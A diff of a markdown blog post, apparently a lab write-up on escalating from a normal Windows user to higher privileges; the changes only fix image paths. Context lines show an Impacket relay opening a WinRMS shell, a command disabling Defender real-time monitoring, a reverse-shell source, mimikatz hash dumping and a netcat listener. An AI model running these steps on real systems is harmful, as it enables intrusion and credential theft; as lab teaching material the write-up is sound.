@@ -109,7 +109,7 @@ Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its aff
 [*] winrms:///@192.168.10.10 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
 
 ```
-![The command for relay](relay.png)
+![The command for relay](images/relay.png)
 
 I can then connect to the interactive shell and grabs the funny flag that I made.
 
@@ -141,7 +141,7 @@ powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true
 
 Now I can get a better and more usable revshell, I just grab the Powershell#3 (base64) payload from [revshells.com](https://www.revshells.com/) then dump the hash using mimikatz
 
-![Dumping hashes](mimikatz.png)
+![Dumping hashes](images/mimikatz.png)
 
 ```powershell
 nc -lvnp 4444
@@ -198,3 +198,5 @@ Hope you enjoyed this little demonstration on how to go from a "normal" user to 
 
 
 **Thx for reading my first post !!**
+
+
